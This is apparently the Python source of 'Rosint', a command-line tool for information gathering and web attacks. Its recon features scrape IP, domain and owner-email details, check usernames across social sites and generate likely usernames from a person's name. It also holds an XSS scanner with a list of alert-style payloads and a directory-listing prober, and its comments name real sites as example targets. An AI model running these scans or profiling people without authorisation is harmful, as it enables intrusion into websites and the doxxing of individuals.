import requests , re , time
import logging
from tqdm import tqdm
from urllib.parse import urlparse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.alert import Alert
from bs4 import BeautifulSoup
from itertools import cycle
timeout = 12
def ip():
    try:
        ip = input('[Info IP] ip >> ')
        addr = ip
        h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}
        ip = "https://www.whatismyip.com/%s/"%(ip)
        rec = requests.get(ip,headers=h)
        rec = BeautifulSoup(rec.content,'lxml')
        render = re.findall(r"list-group-item..(.*)<", str(rec))
        print('''                              Information Of %s
        %s
        %s
        %s\n
                                ISP information of %s\n
                                
        %s
        %s
        %s
        '''%(addr,render[0],render[1],render[2],addr,render[5],render[6],render[7]))
    except:
        print('sorry i dont found anything !! ')
def findbyemail():
    try:
        h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}
        email = input("[Info Email] Email >> ")
        addr = email
        address = 'https://website.informer.com/email/%s'%(email)
        rec = requests.get(address,headers=h)
        rec = BeautifulSoup(rec.content,'lxml')
        render = re.findall(r"/(.*)..More info",str(rec))
        rendername = re.findall(r"keepre-site-e.....(.*? .*? )",str(rec))
        emcheck = re.findall(r"@(.*)",email)
        if emcheck[0] in render:
            render.remove(emcheck[0])
        else:
            pass
        print('\ninformation of %s'%(addr))
        print('\nReal Name => %s'%(rendername[0]))
        a = 1
        for site in render:
            print("%s => %s"%(a,site))
            a += 1
        if a == 10:
            print("├ %s has more than 10 sites."%(addr))
        else:
            pass
    except:
        print('sorry i dont found anything ! ')
def whois():
    try:
        h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}
        print("Without http:// and https://")
        site = input("[Info Domain] Url >> ")
        backup = site
        try:
            newsite = re.findall(r"/.(.*)",site)
            newsite = newsite[0]
        except:
            newsite = site
        site = ("https://website.informer.com/%s"%(newsite))
        rec = requests.get(site,headers=h)
        rec = BeautifulSoup(rec.content,'lxml')
        spltnew = newsite.split('.')
        subdom = re.findall(r"href=\"/(.*?)\"",str(rec))
        a = 1
        cn = len(subdom)
        print("\n       ┌ Subdomains of %s"%backup,'\n')
        for i in range(a,cn):
            if ('.'+spltnew[-1]) not in subdom[i]:
                pass
            elif '/emails' in subdom[i] :
                pass
            elif newsite not in subdom[i]:
                pass
            else:
                print('             ├ %s'%(subdom[i]))
        ips = re.findall(r"<a href=\"/(\d*.\d*.\d*.\d*)\"",str(rec))
        print("\n       ┌ IP Adresses\n")
        lenip = len(ips)
        a = 0
        for i in range(a,lenip):
            print("             ├ IP => %s"%(ips[i]))
        owner = re.findall(r"<a href=\".*\">(.*?)<",str(rec))
        owner = owner[3]
        print('\n       ├ Hosting Service of %s => %s'%(backup,owner))
        emailfind = ("https://website.informer.com/%s/emails"%(newsite))
        rec2 = requests.get(emailfind,headers=h)
        rec2 = BeautifulSoup(rec2.content,'lxml')
        emails = re.findall(r"/email/(.*)\"",str(rec2))
        cw = len(emails)
        b = 0
        print('\n       ┌ Owner Emails of %s'%(backup),'\n')
        for i in range(b,cw):
            if '@' not in emails[i] :
                pass
            else:
                print("             ├",emails[i])
    except:
        print("sorry i dont found anything ! ")
def socialfinder():
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}
    username = input("[Info Username] Username => ")
    i = True
    while i == True:
        try:
            error = "Sorry"
            site = "https://www.reddit.com/user/%s"
            site = (site%(username))
            rec = requests.get(site,headers=h,timeout=timeout).text
            if error in rec:
                pass
            else:
                print("[+] %s"%(site))
            error = "Following"
            site = "https://www.picuki.com/profile/%s"
            site = (site%(username))
            rec = requests.get(site,headers=h,timeout=timeout)
            site = ("https://www.instagram.com/%s"%(username))
            if error or 'Profile is private.' in rec.text:
                print("[+] %s"%(site))
            else:
                pass
            error = "Sorry, this user was not found."
            site = "https://www.ebay.com/usr/%s"
            site = (site%(username))
            rec = requests.get(site,headers=h,timeout=timeout).text
            if error in rec:
                pass
            else:
                print("[+] %s"%(site))
            error = "404 Not Found"
            site = "https://vk.com/%s"
            site = (site%(username))
            rec = requests.get(site,headers=h,timeout=timeout).text
            if error in rec:
                pass
            else:
                print("[+] %s"%(site))
            error = "There is no global account for"
            site = "https://meta.wikimedia.org/wiki/Special:CentralAuth/%s"
            site = (site%(username))
            rec = requests.get(site,headers=h,timeout=timeout).text
            if error in rec:
                pass
            else:
                print("[+] %s"%(site))
            error = ('@'+username)
            site = "https://pinterest.com/%s"
            site = (site%(username))
            rec = requests.get(site,headers=h,timeout=timeout).text
            if error in rec:
                print("[+] %s"%(site))
            else:
                pass
            error = ('@'+username)
            site = "https://profiles.wordpress.org/%s"
            site = (site%(username))
            rec = requests.get(site,headers=h,timeout=timeout).text
            if error in rec:
                print("[+] %s"%(site))
            else:
                pass
            error = "The specified profile could not be found."
            site = "https://steamcommunity.com/id/%s"
            site = (site%(username))
            rec = requests.get(site,headers=h,timeout=timeout).text
            if error in rec:
                pass
            else:
                print("[+] %s"%(site))
            error = "Not Found"
            site = "https://github.com/%s"
            site = (site%(username))
            rec = requests.get(site,headers=h,timeout=timeout).text
            if error in rec:
                pass
            else:
                print("[+] %s"%(site))
            error = "Follow"
            site = "https://www.anime-planet.com/users/%s"
            site = (site%(username))
            rec = requests.get(site,headers=h,timeout=timeout).text
            if error in rec:
                print("[+] %s"%(site))
            else:
                pass
            error = "Anime Stats"
            site = "https://myanimelist.net/profile/%s"
            site = (site%(username))
            rec = requests.get(site,headers=h,timeout=timeout).text
            if error in rec:
                print("[+] %s"%(site))
            else:
                pass
            error = ('@'+username)
            site = "https://myanimelist.net/profile/%s"
            site = (site%(username))
            rec = requests.get(site,headers=h,timeout=timeout).text
            if error in rec:
                print("[+] %s"%(site))
            else:
                pass
        except:
            print("connection issues...\n")
            i = False

def idcreate():
    fname = input("[Username list Maker] Name =>> ")
    lname = input("[Username list Maker] LastName =>> ")
    i = 1
    try:
        while i <= 9:
            create = (fname+'.'+lname)
            print("\n=>> ",create)
            i += 1
            create = (fname+lname)
            print("=>> ",create)
            i += 1
            create = (fname[0]+'.'+lname)
            print("=>> ",create)
            i += 1
            create = (fname+'.'+lname[0])
            print("=>> ",create)
            i += 1
            create = (lname+fname)
            print("=>> ",create)
            i += 1
            create = (fname)
            print("=>> ",create)
            i += 1
            create = (lname)
            print("=>> ",create)
            i += 1
            create = (fname+lname[0])
            print("=>> ",create)
            i += 1
            create = (lname+fname[0])
            print("=>> ",create)
            i += 1
    except:
        print("Error in names . . . !")
def xss():
    def weburl():
        # test : http://www.sudo.co.il/xss/level0.php?email=

        logging.getLogger('selenium.webdriver').disabled = True
        options = Options()
        options.add_argument("--headless")
        options.add_argument("--disable-gpu")

        def has_alert(url):
            driver.get(url)

            try:
                alert = Alert(driver)
                alert.accept()
                return True
            except:
                return False
            
        payloads = ['"autofocus%2Fonfocus%3D"confirm%26%2340%3Bdocument.domain%26%2341%3B#',"\\'-alert(1);//",'<script>alert(1)</script>','" autofocus="" onfocus="alert(1)','<img src="javascript:alert(1)">','<svg onload="alert(1)"></svg>','<iframe src="javascript:alert(1)"></iframe>','<a href="javascript:alert(1)">Click me</a>','#<script>alert(1)</script>',"';this[8680439..toString(30)](1);'","'};this[8680439..toString(30)](1);{'",'"};this[8680439..toString(30)](1);//','" autofocus="" onfocus="alert(1)',"\\'-alert(1);<!--","'-alert(1)-'",'"autofocus/onfocus="confirm&#40;1&#41;','"autofocus/onfocus="alert(1)','\\"-alert(1)}//',"<b onmouseover=alert(1)>click me</b>","{{{constructor.constructor(1)()}}}",'<video><source onerror="alert(1)"></video>','<style/onload=alert(1)>']
        url = input("Enter The URL for XSS Checks ==> ")
        urls = []
        cunt = 0

        for i in payloads:
            a = url + i
            urls.append(a)
        driver = webdriver.Chrome(options=options)

        for url2 in urls:
            if has_alert(url2):
                cunt = cunt + 1
                print('\n[+] XSS vulnerability found with payload:', url2, '(popup detected)\n')
            else:
                print("[-] Testing . . . ")

        print("\n [*] Total XSS vulnerability has founded : " , cunt)
        driver.quit()
    weburl()
def DL():
    #example : https://hls.gsfc.nasa.gov/
    #example : https://dutraincorporacoes.com.br/

    website = input("Enter a website URL to search for directory listing vulnerabilities: ")
    response = requests.get(website)
    if response.status_code == 200:
        cleaned = urlparse(website)
        base_url = cleaned.scheme + "://" + cleaned.netloc
        print("[+] Scan Started\n[+] Your Target =>> " + base_url)
        print("\n")
        links = []
        for link in response.text.split('href="')[1:]:
            link = link.split('"', 1)[0]
            if link.startswith("/"):
                link = base_url + link
            elif not link.startswith("http"):
                link = base_url + "/" + link
            links.append(link)
    else:
        print("Failed to access the website. Status code:", response.status_code)

    links.append(base_url + "/admin/uploads/")
    links.append(base_url + "/configs/")
    links.append(base_url + "/wordpress/")
    links.append(base_url + "/wp-includes/")
    links.append(base_url + "/wp-content/uploads/")
    links.append(base_url + "/wp-content/plugins/")
    links.append(base_url + "/afs/")
    links.append(base_url + "/proc/")
    links.append(base_url + "/.a/")
    links.append(base_url + "/content/")
    links.append(base_url + "/data/")
    links.append(base_url + "/en/")
    links.append(base_url + "/users/")
    links.append(base_url + "/Documente/")
    links.append(base_url + "/documents/")
    links.append(base_url + "/Documents/")
    links.append(base_url + "/img/")
    links.append(base_url + "/static/admin/")
    links.append(base_url + "/admin/img/")
    links.append(base_url + "/admin/images/")
    links.append(base_url + "/admin/assets/")
    links.append(base_url + "/wp-content/themes/")
    links.append(base_url + "/admin/master/")
    links.append(base_url + "/admin/config/")
    links.append(base_url + "/core/")
    links.append(base_url + "/admin/api/")
    links.append(base_url + "/cms/")
    links.append(base_url + "/wp-content/etc/")
    links.append(base_url + "/etc/")
    links.append(base_url + "/upload/")
    links.append(base_url + "/uploads/")
    links.append(base_url + "/checkout/")
    links.append(base_url + "/phpmyadmin/setup/")

    vulnerable_pages = []
    def crawling(link):
        try:
            if link[-1] == '/' :
                pass
            else:
                link = link + '/'
            response = requests.get(link)
            if link in vulnerable_pages:
                pass
            else:
                if "Index of" in response.text \
                    or "Directory listing" in response.text \
                    or "Contents of" in response.text \
                    or "Parent Directory" in response.text \
                    or "Listing of" in response.text \
                    or "Folder Listing" in response.text:
                    vulnerable_pages.append(link)
        except:
            pass
    craw = 0
    a = len(links)
    for i in tqdm (range (a),desc="Crawling...",ascii=True, ncols=75):
        time.sleep(0.01)
        crawling(links[craw])
        craw = craw + 1
    if len(vulnerable_pages) > 0:
        print("The following pages are vulnerable to directory listing:")
        for page in vulnerable_pages:
            print("\n├ " + page)
    else:
        print("No directory listing vulnerabilities found on this website.")


print("\nWelcome To Rosint\n")
print('''
              {
           }   }   {
          {   {  }  }       [*] Information Gathering
           }   }{  {           [1] Info IP
          {  }{  }  }          [2] Info Domain
         ( }{ }{  { )          [3] Info Email (find domains with email)
        .-{   }   }-.          [4] Username list Maker
       ( ( } { } { } )         [5] Info Username
       |`-.._____..-'|      [*] Web Hacking
       |             ;--.     [6] XSS (url base)
       |   (__)     (__  \\   [7] Directory Listing Finder
       |   (oo)      | )  )  [8] Exit
       |    \/       |/  /
       |             /  /    
       |            (  /
       \             y'
        `-.._____..-'
\n''')
load = 0
for i in cycle(['\\','|','/','-']):
        if load == 10:
            break
        else:
            print('loading ',i,end='\r')
            time.sleep(0.2)
            load += 1
user = '0'
while True:
    user = input('[ROSINT] =>> ')
    if user == '1':
        print("\n")
        ip()
    elif user == '2':
        whois()
        print("\n")
    elif user == '3':
        print("\n")
        findbyemail()
        print("\n")
    elif user == '4':
        print("\n")
        idcreate()
        print("\n")
    elif user == '5':
        print("\n")
        socialfinder()
    elif user == '6':
        print("\n")
        xss()
    elif user == '7':
        print("\n")
        DL()
    elif user == '8':
        break
    else:
        print('only use numbers which is provided for you')
print('Thank you for using it.\nExiting . . .')
exit()
